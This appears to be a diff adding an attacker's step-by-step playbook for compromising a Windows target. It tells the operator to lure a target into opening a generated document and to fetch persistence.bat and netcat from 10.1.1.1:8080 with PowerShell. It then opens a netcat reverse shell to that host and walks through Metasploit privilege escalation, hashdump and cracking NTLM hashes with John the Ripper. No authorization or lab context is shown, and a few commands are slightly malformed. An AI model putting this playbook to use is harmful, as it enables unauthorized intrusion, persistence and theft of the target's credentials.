@@ -1,0 +1,105 @@
+- Run msfstarter
+
+- Get target to download document from generator.
+    move the document to the uploads folder if we do not have a clone site for them to use.
+
+MANIFEST RUN COMMANDS IN MS SHELL FOR WINDOWS SHELL:
+
+- Download files:
+powershell -c "Invoke-WebRequest -Uri 'http://10.1.1.1:8080/persistence.bat' -OutFile 'persistence.bat'"
+powershell -c "Invoke-WebRequest -Uri 'http://10.1.1.1:8080/nc.bin' -OutFile 'nc.exe'"
+
+- Start netcat listner
+nc -lvp 8339
+
+- Run file to start netcat shells and persistance:
+nc.exe 10.1.1.1 8339 -e
+
+- Try escalated privalages in metasploit
+
+Once you have a basic shell established, you can use Metasploit to escalate privileges and gain administrator credentials. The following steps will guide you through the process:
+
+    Once you have a Meterpreter session established, run the getsystem command in your Meterpreter session. This command will attempt to use different techniques to escalate privileges:
+
+bash:
+
+meterpreter > getsystem
+
+If this command is successful, you will have system privileges, and you can skip the next steps. Otherwise, proceed with the following steps.
+
+    Identify the target system's architecture (32-bit or 64-bit). You can do this using the sysinfo command in the Meterpreter session:
+
+bash:
+
+meterpreter > sysinfo
+
+    Next, use the background command to put the current Meterpreter session in the background:
+
+bash:
+
+meterpreter > background
+
+    Now, use the post/multi/recon/local_exploit_suggester module to identify potential privilege escalation exploits for the target system:
+
+bash:
+
+msf > use post/multi/recon/local_exploit_suggester
+msf post(local_exploit_suggester) > set SESSION <session_id>
+msf post(local_exploit_suggester) > set SHOWDESCRIPTION true
+msf post(local_exploit_suggester) > run
+
+*****Replace <session_id> with the ID of your Meterpreter session.****
+
+    From the list of suggested exploits, choose an appropriate one based on the target system's architecture and vulnerability.
+
+    Set up and run the chosen exploit:
+
+bash:
+
+msf > use <exploit_name>
+msf exploit(<exploit_name>) > set SESSION <session_id>
+msf exploit(<exploit_name>) > set payload windows/meterpreter/reverse_tcp
+msf exploit(<exploit_name>) > set LHOST <your_kali_ip>
+msf exploit(<exploit_name>) > set LPORT <your_listener_port>
+msf exploit(<exploit_name>) > exploit
+
+Replace <exploit_name> with the name of the chosen exploit, <session_id> with the ID of your Meterpreter session, <your_kali_ip> with your Kali machine's IP address, and <your_listener_port> with the port you want to use for the reverse shell.
+
+    If the exploit is successful, you should have a new Meterpreter session with administrator privileges. Use the hashdump command to dump the password hashes from the system:
+
+bash:
+
+meterpreter > hashdump
+
+Once you have the password hashes, you can attempt to crack them using tools like John the Ripper or hashcat to obtain the clear-text passwords:
+To use John the Ripper to crack the password hashes from the hashdump, you would first save the hashes to a file and then use that file as input for John. Here's how you can do it:
+
+    Save the output of the hashdump command to a file (e.g., hashes.txt).
+
+bash:
+
+meterpreter > hashdump > hashes.txt
+
+    Use John the Ripper to attempt to crack the hashes. Make sure you specify the appropriate format for the hashes. For Windows NTLM hashes, the format is nt:
+
+bash:
+
+john --format=NT hashes.txt
+
+John the Ripper will then start attempting to crack the hashes using its default wordlist.
+
+If you have a specific wordlist you would like to use, you can specify it with the --wordlist option:
+
+bash:
+
+john --format=NT --wordlist=/path/to/your/wordlist.txt hashes.txt
+
+Replace /path/to/your/wordlist.txt with the actual path to your wordlist.
+
+Once John has cracked a password, you can display the results using the --show option:
+
+bash:
+
+john --show hashes.txt
+
+This will display the usernames and cracked passwords.
